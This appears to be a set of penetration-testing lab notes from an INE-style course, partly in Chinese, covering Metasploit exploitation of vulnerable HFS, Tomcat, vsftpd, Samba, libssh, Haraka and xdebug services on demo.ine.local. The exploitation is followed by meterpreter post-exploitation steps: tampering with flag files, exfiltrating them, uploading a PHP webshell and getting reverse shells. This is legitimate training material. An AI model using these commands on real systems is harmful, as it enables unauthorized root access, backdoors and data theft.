## Nmap : Importing Nmap Scan Results Into MSF
	Enumeration :  FTP Enumeration/Apahe Enumeration/MYSQL Enumeration/Postfix Recon: Basics(SMTP)

# Windows Exploitation:
## Windows: HTTP File Server
	nmap -sV -sC demo.ine.local
	80/tcp    open  http               HttpFileServer httpd 2.3
	|_http-server-header: HFS 2.3

	ifconfig (10.10.38.6 )
	msfconsole -q
		search hfs 
		use exploit(windows/http/rejetto_hfs_exec
		set RHOSTS demo.ine.local
## Windows: Java Web Server
	=> Apache Tomcat is a Java web server

	nmap -sV -sC demo.ine.local
	8009/tcp  open  ajp13              Apache Jserv (Protocol v1.3)
	|_ajp-methods: Failed to get a valid response for the OPTION request
	8080/tcp  open  http               Apache Tomcat 8.5.19

	ifconfig (10.10.38.2)
	searchsploit Apache Tomcat 8.5.19
	msfconsole -q
	use exploit(multi/http/tomcat_jsp_upload_bypass)
	set RHOSTS demo.ine.local
# Linux Exploitation
## Vnlnerable FTP Server
	=> VSFTPD (Very Secure FTP Daemon) 
	nmap -sV -sC demo.ine.local
	21/tcp open  ftp     vsftpd 2.3.4
	|_ftp-anon: got code 500 "OOPS: cannot change directory:/nonexistent".

	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	msfconsole -q
	search vsftpd 
	use exploit/unix/ftp/vsftpd_234_backdoor
	set RHOSTS demo.ine.local
	
	[*] Command shell session 1 opened (192.108.87.2:38713 -> 192.108.87.3:6200) at 2025-01-15 20:35:59 +0530
	whoami
	root
## Vulnerable File Sharing Service
	nmap -sV -sC demo.ine.local
	139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
	445/tcp open  netbios-ssn Samba smbd 4.1.17 (workgroup: WORKGROUP)
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	searchsploit Samba linux   
	Samba 3.5.0 < 4.4.14/4.5.10/4.6.4 - 'is_known_pipename()' 
	=> Samba 版本 3.5.0 至 4.4.14、4.5.10 和 4.6.4 中的任意共享庫載入漏洞
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	msfconsole -q
	search linux samba
	use exploit/linux/samba/is_known_pipename
	set RHOST demo.ine.local
	check
	[+] 192.208.68.3:445 - Samba version 4.1.17 found with writeable share 'exploitable'
	[*] 192.208.68.3:445 - The target appears to be vulnerable.
	exploit
	[*] Command shell session 1 opened (192.208.68.2:42941 -> 192.208.68.3:445) at 2025-01-15 20:51:33 +0530
	id
	uid=0(root) gid=0(root) groups=0(root)

## Vnlnerable SSH server
	=> SSH (Secure Shell)
	nmap -sV -sC demo.ine.local
	22/tcp open  ssh     libssh 0.8.3 (protocol 2.0)

	msfconsole -q
	search libssh
	use auxiliary/scanner/ssh/libssh_auth_bypass 
	set RHOSTS demo.ine.local
	set SPAWN_PTY true
	run
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	sessions -i 3
## Vulnerable SMTP Server
	=> service postgresql start

	nmap -sV -sC demo.ine.local
	25/tcp open  smtp    Haraka smtpd 2.8.8
	|_smtp-commands: demo.ine.local Hello Unknown [192.109.105.2], Haraka is at your service., PIPELINING, 8BITMIME, SIZE 0
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	service postgresql start
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	msfconsole -q
		search Haraka
		use exploit/linux/smtp/haraka
		set SRVPORT 9898
		set email_to root@attackdefense.test
		set payload linux/x64/meterpreter_reverse_http
		set rhost demo.ine.local
		set LHOST 192.109.105.2
		exploit
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	sessions -i 1
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	meterpreter > sysinfo 

# Post Exploitation Fundamentals
## Meterpreter Basics
	nmap -sV -sC demo.ine.local
	80/tcp   open  http    Apache httpd 2.4.7 ((Ubuntu))
	3306/tcp open  mysql   MySQL 5.5.47-0ubuntu0.14.04.1
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	dirb http://demo.ine.local
	curl http://demo.ine.local/phpinfo.php
	<h2><a name="module_xdebug">xdebug</a></h2>

	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	msfconsole -q 
	use exploit/unix/http/xdebug_unauth_exec
	set RHOSTS demo.ine.local
	set LHOST 192.103.176.2
	exploit
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	檢查遠端（被利用）電腦上的目前工作目錄。
	meterpreter >pwd
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	列出遠端電腦目前工作目錄中存在的檔案。
	meterpreter >ls
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	檢查本機（攻擊者）電腦上的目前工作目錄。
	meterpreter > lpwd
	/root
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	列出本機電腦目前工作目錄中存在的檔案。
	meterpreter > lls
	Listing Local: /root
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	取得 /app/flag1 檔案中存在的標誌值。
	meterpreter >cat /app/flag1
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	更改 /app/flag1 中存在的標誌值，以便其他人無法獲得正確的標誌。
	meterpreter >edit /app/flag1 :qa!
	meterpreter >cat /app/flag1
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	將目前工作目錄變更為 /app 中命名可疑的目錄，並從該目錄中存在的隱藏檔案讀取標誌。
	meterpreter >cd "Secret Files"
	meterpreter >ls
	meterpreter >cat .flag2
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	將 flag5.zip 獲取到本地計算機，使用密碼 56784 打開它。
	meterpreter > cd /app
	meterpreter > download flag5.zip
	[*] Downloading: flag5.zip -> /root/flag5.zip
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	root㉿INE)-[~]# unzip flag5.zip
	root㉿INE)-[~]# cat list
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	從目錄中刪除 .zip 檔案。
	meterpreter > rm flag5.zip
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	列印提取的文件中提到的文件的校驗和（請參閱 Q8）。
	meterpreter > checksum md5 /bin/bash
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	檢查遠端電腦上的 PATH 環境變數。
	meterpreter > getenv PATH
	PATH      /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	在 PATH 變數中包含的位置之一有一個名稱中包含字串「ckdo」的檔案。列印隱藏在該文件中的標誌。
	meterpreter > search -d /usr/bin -f *ckdo*
	/usr/bin/backdoor  66            2018-10-06 12:03:12 +0530

	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	變更到本機上的工具目錄。
	meterpreter > lcd /root/Desktop/tools
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	將 PHP webshel​​l 上傳到遠端電腦的 app 目錄。
	meterpreter > upload /usr/share/webshells/php/php-backdoor.php
	[*] Completed  : /usr/share/webshells/php/php-backdoor.php -> php-backdoor.php

## Upgrading Command Shells To Meterpreter Shells
	nmap -sV demo.ine.local
	msfconsole -q
	use exploit/linux/samba/is_known_pipename
	set RHOSTS demo.ine.local
	exploit 
	[*] Found shell.
	CTRL + Z
	
	ifconfig (192.21.142.2)
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	use post/multi/manage/shell_to_meterpreter
	set SESSION 1
	set LHOST 192.21.142.2
	run
	[*] Meterpreter session 2 opened (192.21.142.2:4433 -> 192.21.142.3:57508) 
	sessions 2
	meterpreter >
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~



